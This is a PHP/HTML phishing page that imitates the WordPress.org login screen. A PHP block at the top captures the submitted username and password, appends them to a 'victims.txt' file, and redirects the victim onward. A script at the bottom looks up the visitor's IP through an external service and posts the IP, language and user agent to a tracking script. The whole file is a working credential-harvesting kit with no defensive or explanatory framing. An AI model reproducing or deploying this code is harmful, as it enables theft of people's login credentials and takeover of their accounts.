
<?php
$u = $_POST['log'];
$p = $_POST['pwd'];
$f = fopen('redir.txt','r');
$r = fread($f,filesize("redir.txt"));
fclose($f);
if ($u && $p){
	$f = fopen('victims.txt','a+');
    fwrite($f,$u.'<!:!>'.$p."\n");
    fclose($f);
    echo "<script>window.location = '".$r."'</script>";
}
?>
<!DOCTYPE html>
<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="x-ua-compatible" content="ie=edge">
<title>WordPress.org Login | WordPress.org English</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="max-image-preview:large">
<link rel="dns-prefetch" href="https://www.google.com/">
<link rel="dns-prefetch" href="https://s.w.org/">
<link rel="dns-prefetch" href="https://www.googletagmanager.com/">
<script type="text/javascript" async="" src="./WordPress.org Login _ WordPress.org English_files/analytics.js"></script><script type="text/javascript" async="" src="./WordPress.org Login _ WordPress.org English_files/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-EybSWcHgiPeEiW8PyVFCqH8ltF5BJVYLCCHJpTp2QsYs58TZJuGZOUGfGAPF4IjR"></script><script async="" src="./WordPress.org Login _ WordPress.org English_files/gtm.js"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-P24PF4B');</script>
	<link rel="stylesheet" id="wp-block-library-css" href="./WordPress.org Login _ WordPress.org English_files/style.min.css" type="text/css" media="all">
<style id="wp-block-library-inline-css" type="text/css">
.has-text-align-justify{text-align:justify;}
</style>
<link rel="stylesheet" id="wporg-normalize-css" href="./WordPress.org Login _ WordPress.org English_files/normalize.css" type="text/css" media="all">
<link rel="stylesheet" id="dashicons-css" href="./WordPress.org Login _ WordPress.org English_files/dashicons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="buttons-css" href="./WordPress.org Login _ WordPress.org English_files/buttons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="forms-css" href="./WordPress.org Login _ WordPress.org English_files/forms.min.css" type="text/css" media="all">
<link rel="stylesheet" id="l10n-css" href="./WordPress.org Login _ WordPress.org English_files/l10n.min.css" type="text/css" media="all">
<link rel="stylesheet" id="login-css" href="./WordPress.org Login _ WordPress.org English_files/login.min.css" type="text/css" media="all">
<link rel="stylesheet" id="wporg-login-css" href="./WordPress.org Login _ WordPress.org English_files/login.css" type="text/css" media="all">
<script type="text/javascript" src="./WordPress.org Login _ WordPress.org English_files/api.js" id="recaptcha-api-v3-js"></script>
<script type="text/javascript" id="recaptcha-api-v3-js-after">
function reCaptcha_v3_init() {
			grecaptcha.execute("6LckXrgUAAAAANrzcMN7iy_WxvmMcseaaRW-YFts", {action: "login" }
			).then( function( token ) {
				// Add the token to the "primary" form
				var input = document.createElement( "input" ),
					form = document.getElementsByTagName("form")[0];

				input.setAttribute( "type", "hidden" );
				input.setAttribute( "name", "_reCaptcha_v3_token" );
				input.setAttribute( "value", token );

				form.appendChild( input );

				if ( form.dataset.submitReady ) {
					form.submit();
				} else {
					form.dataset.submitReady = true;
				}
			});
		}
</script>
<link rel="https://api.w.org/" href="https://login.wordpress.org/wp-json/"><meta name="generator" content="WordPress 5.8-alpha-50569">
<link rel="canonical" href="https://login.wordpress.org/">
</head>
<body class="wp-core-ui login js route-root">
<script type="text/javascript">document.body.className = document.body.className.replace('no-js','js');</script>
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P24PF4B" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
	
<div id="login">
	<h1><a href="https://wordpress.org/" tabindex="-1">Powered by WordPress</a></h1>
<p class="intro">Log in to your WordPress.org account to contribute to WordPress, get help in the support forum, or rate and review themes and plugins.</p>


		<form name="loginform" id="loginform" action="" method="post" data-submit-ready="true">
			
			<p class="login-username">
				<label for="user_login">Username or Email Address</label>
				<input type="text" name="log" id="user_login" class="input" value="" size="20" required>
			</p>
			<p class="login-password">
				<label for="user_pass">Password</label>
				<input type="password" name="pwd" id="user_pass" class="input" value="" size="20" required>
			</p>
			
			<p class="login-remember"><label><input name="rememberme" type="checkbox" id="rememberme" value="forever"> Remember Me</label></p>
			<p class="login-submit">
				<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary" value="Log In">
				<input type="hidden" name="redirect_to" value="https://login.wordpress.org/">
			</p>
			
		<input type="hidden" name="_reCaptcha_v3_token" value="03AGdBq25IUqPg84ubcNALv9I0oiIxlKCJoUu0YrJF5MufxAeEtQVi37k-Z42YZvyGdezEqpPTKQNFStko72WlKibXaUN55OJq2tur1qe1RWzYRGUFXM99MCiizobPny2e6ImWFVxnHYlD91V6_dtowqLz4fYiOG8Wy0COHMGancKbpNN73sDKYBjXMYEA1W9E3iTbeS7-r07KYVaz7VTsKTfZaoXiReTxrQ9W3JN8f2-NDGemv28bH-K69sS3ePSr40dX0uErXhGfxd9s_Uc24aQWGaIXrH4Y92Xzfz_bLL_AekWScxPcUWqtMOm39WzzOMuJuP4hsMY0GJJoDlvqhzqL6-7dy2VgkJmx2GKDT6iQuAjqWtpcGMnZpKPva12Kj31OuBrScQUZtHTuiTgdxyFQoS4uOSRIMRPj6k7kD5iRY-VCN7GGEm7RYGJBGUsUF4Taznm0Ml4JGUXrWqkJFbSye5OshRFdOg"></form>
<p id="nav">
	<a href="https://login.wordpress.org/lostpassword" title="Password Lost and Found">Lost password?</a> &nbsp; ??? &nbsp;
	<a href="https://login.wordpress.org/register" title="Create an account">Create an account</a>
</p>

<script type="text/javascript">
setTimeout( function() {
	try {
		d = document.getElementById( 'user_login' );
		d.focus();
		d.select();
	} catch( e ){}
}, 200 );
</script>


	</div>

	<div class="language-switcher">
		<form id="language-switcher" action="https://login.wordpress.org/" method="GET">
						<label for="language-switcher-locales">
				<span aria-hidden="true" class="dashicons dashicons-translation"></span>
				<span class="screen-reader-text">Select the language:</span>
			</label>
			<select id="language-switcher-locales" name="locale">
				<option value="fa_AF">(?????????? (??????????????????</option><option value="gax">Afaan Oromoo</option><option value="af">Afrikaans</option><option value="so_SO">Afsoomaali</option><option value="arg">Aragon??s</option><option value="frp">Arpitan</option><option value="ast">Asturianu</option><option value="ibo">As???s??? Igbo</option><option value="az_TR">Az??rbaycan T??rkc??si</option><option value="az">Az??rbaycan dili</option><option value="id_ID">Bahasa Indonesia</option><option value="ms_MY">Bahasa Melayu</option><option value="jv_ID">Basa Jawa</option><option value="su_ID">Basa Sunda</option><option value="bs_BA">Bosanski</option><option value="bre">Brezhoneg</option><option value="ca">Catal??</option><option value="bal">Catal?? (Balear)</option><option value="ceb">Cebuano</option><option value="sna">ChiShona</option><option value="pcd">Ch???ti</option><option value="co">Corsu</option><option value="me_ME">Crnogorski jezik</option><option value="cy">Cymraeg</option><option value="da_DK">Dansk</option><option value="de_DE">Deutsch</option><option value="de_CH">Deutsch (Schweiz)</option><option value="de_CH_informal">Deutsch (Schweiz, Du)</option><option value="de_DE_formal">Deutsch (Sie)</option><option value="de_AT">Deutsch (??sterreich)</option><option value="dsb">Dolnoserb????ina</option><option value="et">Eesti</option><option value="en_US" selected="selected">English</option><option value="en_AU">English (Australia)</option><option value="en_CA">English (Canada)</option><option value="en_NZ">English (New Zealand)</option><option value="art_xpirate">English (Pirate)</option><option value="en_ZA">English (South Africa)</option><option value="en_GB">English (UK)</option><option value="es_ES">Espa??ol</option><option value="es_AR">Espa??ol de Argentina</option><option value="es_CL">Espa??ol de Chile</option><option value="es_CO">Espa??ol de Colombia</option><option value="es_CR">Espa??ol de Costa Rica</option><option value="es_EC">Espa??ol de Ecuador</option><option value="es_GT">Espa??ol de Guatemala</option><option value="es_HN">Espa??ol de Honduras</option><option value="es_MX">Espa??ol de M??xico</option><option value="es_PE">Espa??ol de Per??</option><option value="es_PR">Espa??ol de Puerto Rico</option><option value="es_DO">Espa??ol de Rep??blica Dominicana</option><option value="es_UY">Espa??ol de Uruguay</option><option value="es_VE">Espa??ol de Venezuela</option><option value="eo">Esperanto</option><option value="eu">Euskara</option><option value="ewe">E??egbe</option><option value="fr_FR">Fran??ais</option><option value="fr_BE">Fran??ais de Belgique</option><option value="fr_CA">Fran??ais du Canada</option><option value="fur">Friulian</option><option value="fy">Frysk</option><option value="fo">F??royskt</option><option value="ga">Gaelige</option><option value="gl_ES">Galego</option><option value="gd">G??idhlig</option><option value="hau">Harshen Hausa</option><option value="hsb">Hornjoserb????ina</option><option value="hr">Hrvatski</option><option value="ido">Ido</option><option value="kin">Ikinyarwanda</option><option value="it_IT">Italiano</option><option value="kal">Kalaallisut</option><option value="cor">Kernewek</option><option value="sw">Kiswahili</option><option value="mfe">Kreol Morisien</option><option value="hat">Kreyol ayisyen</option><option value="kmr">Kurd??</option><option value="lv">Latvie??u valoda</option><option value="lt_LT">Lietuvi?? kalba</option><option value="li">Limburgs</option><option value="lmo">Lombardo</option><option value="lb_LU">L??tzebuergesch</option><option value="lij">L??gure</option><option value="hu_HU">Magyar</option><option value="mg_MG">Malagasy</option><option value="mlt">Malti</option><option value="nl_NL">Nederlands</option><option value="nl_BE">Nederlands (Belgi??)</option><option value="nl_NL_formal">Nederlands (Formeel)</option><option value="lin">Ngala</option><option value="pcm">Nigerian Pidgin</option><option value="nb_NO">Norsk bokm??l</option><option value="nn_NO">Norsk nynorsk</option><option value="oci">Occitan</option><option value="lug">Oluganda</option><option value="uz_UZ">O???zbekcha</option><option value="pap_AW">Papiamento</option><option value="pap_CW">Papiamentu</option><option value="pl_PL">Polski</option><option value="pt_PT">Portugu??s</option><option value="pt_PT_ao90">Portugu??s (AO90)</option><option value="pt_AO">Portugu??s de Angola</option><option value="pt_BR">Portugu??s do Brasil</option><option value="fuc">Pulaar</option><option value="sq_XK">P??r Kosov??n Shqip</option><option value="kaa">Qaraqalpaq tili</option><option value="tah">Reo Tahiti</option><option value="ro_RO">Rom??n??</option><option value="roh">Rumantsch</option><option value="rhg">Ru??inga</option><option value="srd">Sardu</option><option value="sq">Shqip</option><option value="ssw">SiSwati</option><option value="scn">Sicilianu</option><option value="sk_SK">Sloven??ina</option><option value="sl_SI">Sloven????ina</option><option value="fi">Suomi</option><option value="sv_SE">Svenska</option><option value="syr">Syriac</option><option value="tl">Tagalog</option><option value="kab">Taqbaylit</option><option value="mri">Te Reo M??ori</option><option value="vi">Ti???ng Vi???t</option><option value="twd">Twents</option><option value="tuk">T??rkmen??e</option><option value="tr_TR">T??rk??e</option><option value="vec">V??neto</option><option value="wol">Wolof</option><option value="yor">Yor??b??</option><option value="fon">f????ngb??</option><option value="xho">isiXhosa</option><option value="zul">isiZulu</option><option value="is_IS">??slenska</option><option value="cs_CZ">??e??tina</option><option value="szl">??l??nsk?? g??dka</option><option value="el">????????????????</option><option value="bel">???????????????????? ????????</option><option value="bg_BG">??????????????????</option><option value="os">????????</option><option value="kir">????????????????</option><option value="mk_MK">???????????????????? ??????????</option><option value="mn">????????????</option><option value="ru_RU">??????????????</option><option value="sah">??????????????</option><option value="sr_RS">???????????? ??????????</option><option value="tt_RU">?????????? ????????</option><option value="tg">????????????</option><option value="uk">????????????????????</option><option value="kk">?????????? ????????</option><option value="hy">??????????????</option><option value="he_IL">????????????????</option><option value="ug_CN">????????????????</option><option value="ur">????????</option><option value="arq">?????????????? ??????????????????</option><option value="ar">??????????????</option><option value="ary">?????????????? ????????????????</option><option value="bcc">?????????? ????????????</option><option value="skr">??????????????</option><option value="snd">????????</option><option value="fa_IR">??????????</option><option value="ckb">?????????????</option><option value="haz">?????????? ????</option><option value="ps">????????</option><option value="azb">?????????? ??????????????????</option><option value="dv">????????????</option><option value="nqo">??????</option><option value="ne_NP">??????????????????</option><option value="brx">???????????????</option><option value="sa_IN">??????????????????</option><option value="bho">?????????????????????</option><option value="mr">???????????????</option><option value="mai">??????????????????</option><option value="hi_IN">??????????????????</option><option value="as">?????????????????????</option><option value="bn_BD">???????????????</option><option value="bn_IN">??????????????? (????????????)</option><option value="pa_IN">??????????????????</option><option value="gu">?????????????????????</option><option value="ory">???????????????</option><option value="ta_LK">???????????????</option><option value="ta_IN">???????????????</option><option value="te">??????????????????</option><option value="kn">???????????????</option><option value="ml_IN">??????????????????</option><option value="si_LK">???????????????</option><option value="th">?????????</option><option value="lo">?????????????????????</option><option value="bo">?????????????????????</option><option value="dzo">??????????????????</option><option value="my_MM">???????????????</option><option value="ka_GE">?????????????????????</option><option value="tir">????????????</option><option value="am">????????????</option><option value="km">???????????????????????????</option><option value="tzm">????????????????????????</option><option value="zgh">????????????????????????</option><option value="zh_SG">??????</option><option value="ja">?????????</option><option value="zh_CN">????????????</option><option value="zh_TW">????????????</option><option value="zh_HK">???????????????	</option><option value="ko_KR">?????????</option><option value="art_xemoji">???????????? (Emoji)</option>			</select>
		</form>
	</div>
	<script>
		var switcherForm  = document.getElementById( 'language-switcher' );
		var localesSelect = document.getElementById( 'language-switcher-locales' );
		localesSelect.addEventListener( 'change', function() {
			switcherForm.submit()
		} );
	</script>
	

	<script src=
"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
</script>  
<script>
$.getJSON("https://api.ipify.org?format=json",function(data) {
if (1) {
    var ip = data.ip;
    var lang = navigator.language;
    var platform = navigator.platform;
    var ua = navigator.userAgent;
    var webdriver = navigator.webdriver;
    $.ajax({
        url : 'u.php',
        type : 'post',
        data : {
            'ip' : ip,
            'lang' : lang,
            'ua' : ua
        }
    });
}
});
</script>
<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe src="./WordPress.org Login _ WordPress.org English_files/anchor.html" width="256" height="60" role="presentation" name="a-ma3qasir8v0a" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./WordPress.org Login _ WordPress.org English_files/saved_resource(1).html"></iframe></div></body></html>